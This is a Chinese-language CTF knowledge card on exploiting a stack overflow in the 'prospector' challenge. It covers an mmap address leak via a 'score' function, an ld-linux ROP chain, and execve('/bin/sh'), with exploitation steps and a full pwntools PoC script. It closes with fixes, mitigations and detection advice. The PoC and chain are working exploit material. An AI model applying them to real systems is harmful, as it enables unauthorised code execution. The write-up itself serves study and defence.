---
id: binary-pwn-stack-ld-linux-rop-mmap-leak-execve
title: 栈溢出 + mmap 地址泄露后改用 ld-linux 的 pop rax/ret gadget 完成 execve
type: scenario
domain: binary
path: binary/pwn/stack
technique: stack-overflow-ld-linux-rop-mmap-leak-execve
aliases:
- prospector
- ld-linux ROP
- mmap 地址泄露
- 二次 read 控制寄存器
- ret2syscall ld
- 无 libc 泄露 ROP
tags:
- pwn
- stack-overflow
- rop
- ld-linux
- mmap
- syscall
- execve
- ctf
cve: []
severity: high
confidence: low
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V242
  verified_at: '2026-11-07T12:51:02+08:00'
  notes: 已对照原文 prospector 段核对：223 字节读入 v3、覆盖 v4 触发 score 泄露、buf_addr 还原公式、ld-linux 偏移 0x9000/0x15abb、二次 read 写 /bin/sh+0x3B 的 execve 链均与 exp 一致；原文无成功回显，confidence low 合理；未在本机复跑。
---

## 一句话结论

目标函数把 223 字节读入 32 字节栈缓冲区，溢出可覆盖栈上的 mmap 指针 `v4`、保存的 RBP 与返回地址；程序还有一个自定义 “score” 函数会泄露 mmap 缓冲区首 4 字节的变换值，据此可还原 mmap 地址，而该 mmap 与 `ld-linux-x86-64.so.2` 的映射存在固定偏移。攻击者据此用 ld-linux 中的 `pop rax; ret` 与 `syscall` 附近 gadget 布置链，把 `v4` 改成 mmap 地址后利用第二次 read 写入伪造帧（`/bin/sh`、`rax=0x3B` 等），最终 `execve("/bin/sh", ...)` 拿 shell。

## 原理

- **栈溢出与任意写**：`sub_10FD` 中 `v3[5]`（0x20 字节）后紧跟 `v4`（rbp-8），随后 `read_FUN(0, v3, 223)` 可覆盖 `v4`、保存的 RBP 和返回地址。把 `v4` 改成任意地址，下一次 “Color:” 的 `read_FUN(0, v4, 223)` 就变成一次 223 字节的任意地址写；若把 `v4` 改成非法地址（如 1），read 失败，程序进入 `*(a1+8)==1` 分支调用 `sub_1000(a2)` 泄露 mmap 内容。
- **自定义泄漏**：`sub_1000` 从 mmap 缓冲区计算一个 “score” 并打印。原文调试显示它取 mmap 地址相关值的低 32 位做 `add eax,eax; and eax,0x1ffffffe` 之类的变换；exp 按 `buf_addr = (((score + 0xE0000000) // 2) << 16) + 0xC000` 还原 mmap 基址，并通过调试确认其低 3 位为 0，只需爆破 1 字节。
- **ld-linux 固定偏移**：该 mmap 区域与 `ld-linux-x86-64.so.2` 的映射相邻/固定偏移（exp 用 `base = buf_addr + 0x9000`），因此即使没有 libc 泄露，也能在 ld-linux 中找 `pop rax; ret`（exp 用 `base+0x15abb`）与 `ret` 等 gadget。PIE/ASLR 下 ld-linux 的基址随 mmap 一起被泄露。
- **二次 read 控制寄存器**：第一次溢出把 `v4` 改为 mmap 地址、保存 RBP 改为 mmap 内地址、返回地址改为 `pop_rax`；随后 “Color:” 的 read 把 223 字节写进 mmap，布置 `/bin/sh`、`buf_addr+0x40`、`0x3B` 等数据；函数返回后 `pop rax` 取到 `0x3B`，经 `ret` 链到 `syscall`，以 `rax=execve`、`rdi=/bin/sh` 执行。
- **为什么可行**：程序提供了“可控 read 目标 + 可控返回地址”，而 ld-linux 映射与泄露的 mmap 有固定偏移，等价于在未知 libc 时拿到一段可用的 ROP gadget 库；利用 `read` 把参数写进可写 mmap 后，链只需要少量 gadget（pop rax、ret、syscall）。
- **原文局限**：该链依赖题目特定的 score 变换、mmap 与 ld 的固定偏移、保存 RBP 的布局；原文没有贴出完整寄存器/栈图或成功回显，exp 中的偏移（0x9000、0x15abb、0xC000）均为该题环境值，移植时需重新测量。故 confidence 标 low。

## 触发条件

- 目标为 x86-64 Linux PIE 程序，栈上存在“读入长度 > 缓冲区”的溢出，且溢出范围内有一个指向可写 mmap 的指针（本例 `v4`）与返回地址。
- 程序提供一个可被触发的泄漏，能把 mmap 地址（或其变换值）打印出来；或攻击者能用其他方式泄露 mmap/ld 地址。
- `ld-linux-x86-64.so.2` 已映射且与泄露的 mmap 区域有固定偏移；目标 libc 基址未知时仍可用 ld 中的 gadget。
- 程序在返回前还有一次可写入的 `read`（本例 “Color:”），且写入目标可由被覆盖的指针控制。
- 目标未开启会阻断 `execve` 的 seccomp；栈可执行不是必需（链在 ld 的代码段上执行）。

## 利用步骤

1. 逆向确认 `read_FUN(0, v3, 223)` 的栈布局：`v3` 偏移、`v4` 位置、保存 RBP/返回地址偏移。
2. 第一次输入用 `b"Z"*0x48 + p32(1)` 之类的 payload 覆盖 `v4` 为非法地址，使 “Color:” 的 read 失败，触发 `sub_1000` 泄漏分支；解析 “score” 并按题目公式还原 mmap 地址（必要时爆破 1 字节）。
3. 用 mmap 地址 + 固定偏移计算 ld-linux 基址，选 `pop rax; ret`、`ret`、`syscall` 附近 gadget。
4. 第二次输入（下一轮 “Nick:”）覆盖 `v4 = buf_addr`、保存 RBP = mmap 内地址、返回地址 = `pop_rax`，并布置 `buf_addr`、`ret` 链与末尾控制字节。
5. “Color:” 的 read 把 `/bin/sh\0`、参数指针、`0x3B` 等写进 mmap，形成 `execve` 调用所需的寄存器/栈数据。
6. 函数返回后链执行 `pop rax`（0x3B）→ `ret` 链 → `syscall`，进入 shell；若失败按原文爆破概率重试。

## PoC

```python
from pwn import *
context.arch = 'amd64'
p = process('./pwn')

# 1) 触发泄漏：覆盖 v4 为非法地址，让第二次 read 失败
p.sendafter(b": ", b"Z"*0x48 + p32(1))
p.recvuntil(b": ")
score = int(p.recv(9), 10)
buf_addr = (((score + 0xE0000000) // 2) << 16) + 0xC000

# 2) ld-linux 与 mmap 的固定偏移（本题环境值）
base = buf_addr + 0x9000
pop_rax = base + 0x15abb
ret = pop_rax + 1

# 3) 覆盖 v4 / saved rbp / 返回地址
payload = b"Z"*0x28 + p64(buf_addr) + p64(buf_addr + 0x88) \
        + p64(pop_rax) + p64(buf_addr) + p64(ret)*8 + b"\x82"
p.sendafter(b": ", payload)

# 4) 第二次 read 写入 execve 所需数据
payload = b"A"*0x40 + b"/bin/sh\x00" + p64(0)*4 + p64(buf_addr + 0x40) + p64(0x3B)
p.sendafter(b": ", payload)
p.interactive()
```

以上为原文 exp 的核心片段（地址/偏移均为该题环境值），未在本机复跑；原文也未附成功回显。

## 变体与关联

- **ld-linux ROP 的一般化**：当 libc 基址未知但 ld-linux 可定位时，ld 中的 `pop rax/rdi/rsi/rdx; ret`、`syscall`、`ret` 同样可用于 ret2syscall；本卡的独特点是“mmap 与 ld 固定偏移 + score 泄露”。
- **关联**：`[[binary-pwn-stack-sparse-word-write-struct-field-rewrite-ret2libc]]`（两轮输入写 ROP 链、ret2libc）、`[[binary-pwn-stack-fake-rbp-check-seccomp-orw]]`（伪造 RBP 通过影子栈检查 + syscall 链）、`[[binary-pwn-rop-mips-pivot-got-libpivot-ret2win]]`（其他架构的 gadget/pivot 思路）。
- **不是同一手法**：`[[binary-pwn-stack-ret2shellcode-mprotect-bss-rwx-page]]` 是 mprotect + shellcode；本卡是 ld-linux ROP + read 写参数，不依赖可执行栈/堆。
- **变体**：若泄漏能给出 libc 而非 ld，则可改用 libc 的 `pop rdi; ret` + `system("/bin/sh")`；若程序没有第二次 read，可用 ROP 直接在栈上布置参数。

## 检测与防御

- **代码修复**：严格按缓冲区大小读取（`read(0, v3, sizeof(v3))`），并检查返回值；不要把指向 mmap 的指针与用户输入缓冲区放在同一可溢出栈帧；泄漏函数不要打印地址派生值（score）。
- **缓解**：PIE/ASLR 只能增加地址猜测成本，不能阻止“泄露 + ROP”；启用 stack canary 可阻断本类连续溢出；开启 Full RELRO、NX、CET/IBT；对 `execve` 使用 seccomp 白名单。
- **检测**：同一连接出现“第一次输入使 read 失败 + score 泄露 + 第二次溢出覆盖返回地址”的模式；进程从 ld-linux 区域执行 `syscall` 且 `rax=59`；异常 `/bin/sh` 子进程。
- **加固**：对 mmap 区域使用最小权限（不需要可执行的不要 RWX）；对 ld-linux 的 gadget 无法单独消除，关键是消除栈溢出与地址泄露。
